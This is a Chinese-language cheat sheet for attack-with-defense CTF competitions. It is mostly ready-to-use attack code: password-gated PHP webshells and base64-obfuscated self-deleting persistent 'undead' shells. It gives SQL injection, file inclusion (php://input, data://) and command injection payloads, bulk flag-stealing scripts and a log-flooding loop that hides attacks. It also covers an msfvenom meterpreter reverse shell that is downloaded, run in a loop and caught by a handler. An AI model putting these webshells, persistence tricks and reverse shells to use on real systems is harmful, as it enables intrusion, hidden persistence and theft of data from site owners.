## 先准备一款只能被自己利用的一句话，如md5加密的马子
```
root@kali:/tmp/2/html# echo -n v5est0r|md5sum
10972d718c21fdc8718efbaa8e67740e  -

vi .index.php
<?php $a="s"."y"."st"."em";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>

POST:2=v5est0r&1=cat /flag.txt
```

## php代码审计常用函数

##### 1) 文件读取/写入
```
file_get_contents()
highlight_file()
fopen()
readfile()
//echo readfile("test.txt");
fread()

fgets() 函数从打开的文件中读取一行。
与fgets() 相同，不同的是fgetss尝试从读取的文本中去掉任何HTML和PHP标记。

parse_ini_file()
show_source()
file()
```

```
//file_put_contents
<?php 
$test='<?php eval($_POST[cmd]);?>';
file_put_contents('test1.php',$test);
?>

//fputs
<?php 
fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>'); 
?>
```
##### 2) 代码执行函数
```
eval()
//eval("system('ls');");
```
```
assert() 
//assert(system("cat /flag.txt");
```
```
preg_replace() 
//必须有一次匹配：preg_replace("/abc/e","system('cat /flag.txt')","abcd")
//7.0.0	不再支持 /e修饰符。 请用 preg_replace_callback() 代替。
//5.5.0	/e 修饰符已经被弃用了。使用 preg_replace_callback() 代替。参见文档中 PREG_REPLACE_EVAL 关于安全风险的更多信息。
```
```
create_function()  
//

$func =create_function('',"system('ls -al');");$func();
```
```
call_user_func() / call_user_func_array()
//?cmd=phpinfo()
@call_user_func(assert,$_GET['cmd']);
//?cmd=phpinfo()
$array[0]=$_GET['cmd'];
call_user_func_array("assert",$array);
```
```
array_map()
//$array[0]="ls";$new_array=array_map("system",$array);第一个参数是函数名，第二个参数必须是数组。
//array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。
```
##### 3) 命令执行函数
```
system()
exec()
shell_exec()
passthru()
pcntl_exec()
popen()
proc_open()
``
```

**eg. 1.php**

```
root@3cbe3e36a767:/# cat 1.php
<?php
system('id');
passthru('id');
echo exec('id')."\n";
echo shell_exec("id");
echo `id`;
?>
root@3cbe3e36a767:/# php 1.php
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
```

`无回显的popen()`

```
root@kali:/var/www/html# cat 123.php
<?php
$fp = popen("/bin/cat /flag.txt >123.txt","r");
?>
root@kali:/var/www/html# php 123.php
root@kali:/var/www/html# cat 123.txt
16dee3a64a607c423fdfd866be7c3762
```


##### 4) 文件包含函数
```
include()
include_once()
require()
require_once()
```
`include()`当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行。
`require()`是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行 require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件 。
`include_once()、require_once()`与(`include\require`)的功能相同,只是区别于当重复调用的时候，它只会调用一次。

##### 5) 动态函数

PHP函数直接由字符串拼接
代码示例：

```
//?a=assert&b=phpinfo()
<?php 
$_GET['a']($_GET['b']);
?>

<?php
$a="s"."syt"."em";$a("ls");
?>
```

## 常规漏洞 GET flag

#### SQL injection
```
http://172.16.2.234:8011/inject.php?id=1' and 1#
http://172.16.2.234:8011/inject.php?id=1 and 1#
http://172.16.2.234:8011/inject.php?id=1 order by 5#
http://172.16.2.234:8011/inject.php?id=1 order by 3#
http://172.16.2.234:8011/inject.php?id=1 order by 4#

http://172.16.2.234:8011/inject.php?id=-1 union select null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null# 
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,null# 

http://172.16.2.234:8011/inject.php?id=-1 union select null,@@version,null#
http://172.16.2.234:8011/inject.php?id=-1 union select null,null,load_file('/flag.txt')#
```

#### 文件包含

常见包含函数有：`include()、require()、include_once()、require_once()`
区别：

include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件
`include_once()、require_once()`与(`include\require`)的功能相同,只是区别于当重复调用的时候，它只会调用一次。
```
<?php
include($_GET['filename']);    
?>
```

```
http://172.16.2.234:8011/include.php?filename=info.txt
http://172.16.2.234:8011/include.php?filename=file:///flag.txt

http://172.16.2.234:8011/include.php?filename=php://filter/convert.base64-encode/resource=/flag.txt
//读取到文件的base64编码，可用于读取php文件源码
echo "YmE2YzJkNDgzYjllZTQ5OWIwZjYxZjg4YmJlNGEzYzU="|base64 -d
ba6c2d483b9ee499b0f61f88bbe4a3c5
```
###### 下面的需要allow_url_include=On
```
//远程文件包含
http://172.16.2.234:8011/include.php?filename=[http|https|ftp|smb]://192.168.0.1/shell.txt //(需要allow_url_fopen=On并且 allow_url_include=On)

//php://input
http://172.16.2.234:8011/include.php?filename=php://input
POST: <?php echo file_get_contents("/flag.txt");?>

//data://
http://172.16.2.234:8011/include.php?filename=data://text/plain;base64,base64编码的php代码(不含结束标记?>)
echo '<?php echo file_get_contents("/flag.txt");'|base64
PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0Iik7Cg==
http://172.16.2.234:8011/include.php?filename=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0Iik7Cg==
```

#### 命令执行注入
```
http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp|ls -al

http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp|cat /flag.txt

http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp;cat /flag.txt

//& urlencode>%26
http://172.16.2.234:8011/list.php
POST:ipaddr=/tmp %26 cat /flag.txt
POST:ipaddr=/tmp %26%26 cat /flag.txt
```

## 常规漏洞写不死马

简单的不死马：
**`.1.php`**
```
<?php unlink(".1.php");ignore_user_abort(true);set_time_limit(0);
$code="PD9waHAgJG09ImFzIi4icyIuImVydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09JzEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlJyl7JG0oJF9QT1NUWzFdKTt9Pz4=";
/*
<?php $m="as"."s"."ert";if (md5($_POST[2])==='10972d718c21fdc8718efbaa8e67740e'){$m($_POST[1]);}?>
*/
while(1){
file_put_contents(".index.php",base64_decode($code));
system("chmod 755 .index.php");
sleep(0); 
}
?>
```
```
curl 172.16.2.234:8011/.1.php --max-time 3
curl 172.16.2.234:8011/.index.php -d "2=v5est0r&1=system('ls -al')"
```


```
<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
$code=base64_decode("ZmlsZV9wdXRfY29udGVudHMoJ2luZGV4LnBocCcsJzw/cGhwICRhPSJhIi4icyIuInNlIi4icnQiO2lmIChtZDUoJF9QT1NUWzJdKT09PSIxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZSIpeyRhKCRfUE9TVFsxXSk7fT8+JyxGSUxFX0FQUEVORCk7");
/*
file_put_contents('index.php','<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>',FILE_APPEND);
*/
while(1){
  @eval($code);
  sleep(30); 
}
?>
```
加密：
```
PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn0KPz4=
```
不死马加入到index.php的一句话木马：

```
//v5est0r
<?php $a="a"."s"."se"."rt";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>
POST: 2=v5est0r&1=system("ls -al")
```


##### 文件包含写不死

http://172.16.2.234:8011/include.php?filename=php://input

POST：
```
<?php file_put_contents("/var/www/html/s1.php",base64_decode("PD9waHAKdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Cmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9YmFzZTY0X2RlY29kZSgiWm1sc1pWOXdkWFJmWTI5dWRHVnVkSE1vSjJsdVpHVjRMbkJvY0Njc0p6dy9jR2h3SUNSaFBTSmhJaTRpY3lJdUluTmxJaTRpY25RaU8ybG1JQ2h0WkRVb0pGOVFUMU5VV3pKZEtUMDlQU0l4TURrM01tUTNNVGhqTWpGbVpHTTROekU0WldaaVlXRTRaVFkzTnpRd1pTSXBleVJoS0NSZlVFOVRWRnN4WFNrN2ZUOCtKeXhHU1V4RlgwRlFVRVZPUkNrNyIpOwovKgpmaWxlX3B1dF9jb250ZW50cygnaW5kZXgucGhwJywnPD9waHAgJGE9ImEiLiJzIi4ic2UiLiJydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4nLEZJTEVfQVBQRU5EKTsKKi8Kd2hpbGUoMSl7CiAgQGV2YWwoJGNvZGUpOwogIHNsZWVwKDMwKTsgCn0KPz4="));?>
```

然后访问根目录s1.php， http://172.16.2.234:8011/s1.php 即可追加一句话木马到index.php，循环往复。

```
curl http://172.16.2.234:8011/index.php --data "2=v5est0r&1=system('ls -al')"
```

命令执行写不死马，测试可行：
```
1=system("echo PD9waHAgdW5saW5rKCIuMS5waHAiKTtpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTtzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9IlBEOXdhSEFnSkcwOUltRnpJaTRpY3lJdUltVnlkQ0k3YVdZZ0tHMWtOU2drWDFCUFUxUmJNbDBwUFQwOUp6RXdPVGN5WkRjeE9HTXlNV1prWXpnM01UaGxabUpoWVRobE5qYzNOREJsSnlsN0pHMG9KRjlRVDFOVVd6RmRLVHQ5UHo0PSI7Ci8qCjw/cGhwICRtPSJhcyIuInMiLiJlcnQiO2lmIChtZDUoJF9QT1NUWzJdKT09PScxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZScpeyRtKCRfUE9TVFsxXSk7fT8+CiovCndoaWxlKDEpewpmaWxlX3B1dF9jb250ZW50cygiLmluZGV4LnBocCIsYmFzZTY0X2RlY29kZSgkY29kZSkpOwpzeXN0ZW0oImNobW9kIDc1NSAuaW5kZXgucGhwIik7CnNsZWVwKDApOyAKfQo/Pg==|base64 -d > .1.php");
```
或者：

```
1.
1=system("echo PD9waHAgdW5saW5rKCIuMS5waHAiKTtpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTtzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9IlBEOXdhSEFnSkcwOUltRnpJaTRpY3lJdUltVnlkQ0k3YVdZZ0tHMWtOU2drWDFCUFUxUmJNbDBwUFQwOUp6RXdPVGN5WkRjeE9HTXlNV1prWXpnM01UaGxabUpoWVRobE5qYzNOREJsSnlsN0pHMG9KRjlRVDFOVVd6RmRLVHQ5UHo0PSI7Ci8qCjw/cGhwICRtPSJhcyIuInMiLiJlcnQiO2lmIChtZDUoJF9QT1NUWzJdKT09PScxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZScpeyRtKCRfUE9TVFsxXSk7fT8+CiovCndoaWxlKDEpewpmaWxlX3B1dF9jb250ZW50cygiLmluZGV4LnBocCIsYmFzZTY0X2RlY29kZSgkY29kZSkpOwpzeXN0ZW0oImNobW9kIDc1NSAuaW5kZXgucGhwIik7CnNsZWVwKDApOyAKfQo/Pg== > .bs4");

2.
1=system("base64 -d .bs4 > .1.php");

```

下面再命令行测试可以，在web测试不可以：
```
echo '<?php unlink(".1.php");ignore_user_abort(true);set_time_limit(0);$code="PD9waHAgJG09ImFzIi4icyIuImVydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09JzEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlJyl7JG0oJF9QT1NUWzFdKTt9Pz4=";while(1){file_put_contents(".index1.php",base64_decode($code));system("chmod 755 .index1.php");sleep(0); }?>' > .1.php
```


### 对抗不死马
根据日志发现攻击日志。
```
while (true);do echo test >/var/www/html/shell.php;done &
```

## 批量提交flag
#### if题目要求只提交flag：
批量GET FLAG：
```
#!/bin/bash
for i in {1..3}
do
	for h in {1..3}
	do
		echo flag80$i$h
		curl 172.16.2.234:80$i$h/include.php?filename=php://input --data "<?php system('cat /flag.txt');?>" --max-time 3 -s
		echo flag80$i$h
		curl 172.16.2.234:80$i$h/.s.php --data "1=system('cat /flag.txt');" --max-time 3 -s
		echo flag80$i$h
	done
done
```
```
bash 1.sh >>2.txt
leafpad 2.txt
```
编辑，去掉多余部分，留下每行flag：

```
for i in `cat flag.txt`;do curl 172.16.2.234:8888/commit.php --data "myid=001&flag=$i" -s --cookie "PHPSESSID=fl51bmlkjhiblfttram3fg76n1";done
```

如果题目有提交间隔限制，如10s

vi编辑，去掉多余部分，留下每行flag：
```
for i in `cat flag.txt`;do curl 172.16.2.234:8888/commit.php --data "myid=001&flag=$i" -s --cookie "PHPSESSID=fl51bmlkjhiblfttram3fg76n1";sleep 11s;done
```

#### if题目要求提交ip和flag
```
root@kali:/# cat 1
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
aa,bb,cc
root@kali:/# cat 1|cut -d \, -f 2
bb
bb
bb
bb
bb
bb
bb
bb
bb
```
### 日志干扰法
```
grep php -lr|grep vulnerabilities > list.txt

while true;do for u in `cat list.txt`;do curl --data "kdjwekk=dwddw" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" http://172.16.2.234:8021/$u;curl --data "jkd=wfdwef" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0" http://172.16.2.234:8011/$u;echo 1;done;done
```

### msf木马
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.2.241 LPORT=4433 -f elf -o /tmp/3322
scp -P 2231 /tmp/3322 hack@172.16.2.234:/var/www/html/3322

wget 172.16.2.234:8031/3322 -O /tmp/3322
chmod 777 /tmp/3322
while true;do /tmp/3322;done &


use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
show options
set LPORT 4433
set LHOST 172.16.2.241

exploit -j

background

sessions -l
sessions -i 1
```




